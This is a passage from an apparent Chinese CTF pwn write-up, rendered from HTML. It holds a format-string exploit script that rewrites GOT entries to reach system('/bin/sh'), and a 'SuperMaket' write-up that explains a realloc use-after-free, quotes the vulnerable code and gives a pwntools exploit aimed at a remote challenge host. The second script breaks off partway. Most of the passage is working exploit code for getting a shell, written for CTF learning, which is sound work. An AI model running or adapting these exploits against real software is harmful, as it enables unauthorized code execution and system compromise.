<span class="token comment" spellcheck="true">#  ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>

<span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>
        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>
    <span class="token keyword">return</span> fmtstr


<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
    <span class="token keyword">return</span> payload

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'\x31'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">9</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token number">10</span>
    start_addr <span class="token operator">=</span> <span class="token number">0x400750</span>
    exit_got   <span class="token operator">=</span> exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span>
    exit_plt   <span class="token operator">=</span> <span class="token number">0x400720</span>
    fmt_addr <span class="token operator">=</span> <span class="token number">0x400982</span>

    <span class="token comment" spellcheck="true">#leaking libc    </span>
    fini_array <span class="token operator">=</span> <span class="token number">0x400a74</span>
    <span class="token comment" spellcheck="true">#modify exit got as fmt_start</span>
    <span class="token comment" spellcheck="true">#can't set addr at front</span>
    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_addr <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span> <span class="token operator">+</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>exit_got<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'exit_got: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>exit_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#leaking libc</span>
    ru<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'$p'</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    __libc_start_main <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
    <span class="token comment" spellcheck="true">#db()</span>
    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span> __libc_start_main<span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> __libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
    sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
    printf_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#log</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'printf_got: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'system_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'printf_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

    li<span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token number">0x550000</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    rb3 <span class="token operator">=</span> <span class="token punctuation">(</span>sys_addr <span class="token operator">&amp;</span> <span class="token number">0xFF0000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'sys_5: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>rb3<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># modify printf got addr as system</span>
    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>rb3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%13$hhn'</span>
    p <span class="token operator">+=</span>  <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>sys_addr <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">-</span> rb3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%14$hn'</span>

    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0xFF0000</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0xFFFF</span>

    <span class="token comment" spellcheck="true">#db()</span>
    s<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="SuperMaket"><a href="#SuperMaket" class="headerlink" title="SuperMaket"></a>SuperMaket</h1><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h3><p>添加和删除基本上没有十分严密, 找不到漏洞, 输入的长度且必须是n - 1, 不存在 off by one.然而在修改description的时候,当新的大小与以前大小不同时, 就会realloc重新分配内存.但没有跟新list数组中的指针.若重新分配大的话, 就造成use after free.</p>
<p>简要说一下 realloc函数吧:</p>
<p>extern void *realloc(void *mem_address, unsigned int newsize);</p>
<p>realloc会根据newsize大小来判断怎样分配新的内存, 并却将原来的数据拷贝到新分配的内存中.</p>
<p>realloc包含了 malloc, free, memcpy三个函数功能, 若新的大小过大的时候, 且在相邻chunk没有空间可分配, 这时候,系统就会去找一个空间够的地方来开辟内存, 这时候就可能涉及到这三个函数的功能. malloc新的内存, mcmcpy拷贝数据, free掉以前的chunk.</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a>漏洞代码:</h3><pre class=" language-c++"><code class="language-c++">for ( size = 0; size <= 0 || size > 256; size = inputNum() )
    printf("descrip_size:");
  if ( *((_DWORD *)(&list_0)[v1] + 5) != size )
    realloc(*((void **)(&list_0)[v1] + 6), size); //漏洞点
  printf("description:");
  return inputName(*((_DWORD *)(&list_0)[v1] + 6), *((_DWORD *)(&list_0)[v1] + 5));
}</code></pre>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路:"></a>整体思路:</h3><h4 id="获得libc的基地址"><a href="#获得libc的基地址" class="headerlink" title="获得libc的基地址:"></a>获得libc的基地址:</h4><p>利用这个漏洞来修改free函数的got表为puts, 传入参数为atoi函数的got地址.调用free时, 获得atoi在libc中的地址.计算偏移即可</p>
<h4 id="调用system"><a href="#调用system" class="headerlink" title="调用system."></a>调用system.</h4><p>获得libc地址之后, 也利用这个漏洞修改atoi的got表地址为system地址.然后在进行选择的时候直接传入参数 ‘/bin/sh’即可获得shell.当然还可以继续修改free的got地址为system.但需要得到’/bin/sh’在libc中的地址, 且在chunk头的decription地址中写入该地址.调用free也行, 我试过了, system虽然能调用成功, 就是这个’/bin/sh’在libc中的偏移有问题. 结果 就是sh :cmd not found</p>
<p>以上就是整体思路:</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>

<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile  <span class="token operator">=</span> <span class="token string">"supermarket"</span>
libFile  <span class="token operator">=</span> <span class="token string">"libc.so.6"</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">57966</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ad<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'1'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#不要向free掉的数据块中写入数据. 不然后期无法malloc</span>
    ad<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'2'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x32</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'\x19'</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># modify dscription addr as free got addr</span>
    p2 <span class="token operator">=</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    md<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#modify free got addr as puts got addr</span>

    <span class="token comment" spellcheck="true"># leaking</span>
    p3 <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x32</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
    p3 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p3 <span class="token operator">+=</span> <span class="token string">'\x19'</span>
    md<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#puts atoi addr in libc</span>
    atoi_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0015902b</span>

    <span class="token comment" spellcheck="true">#modify got addr as system</span>
    ad<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'3'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    p4 <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x32</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
    p4 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
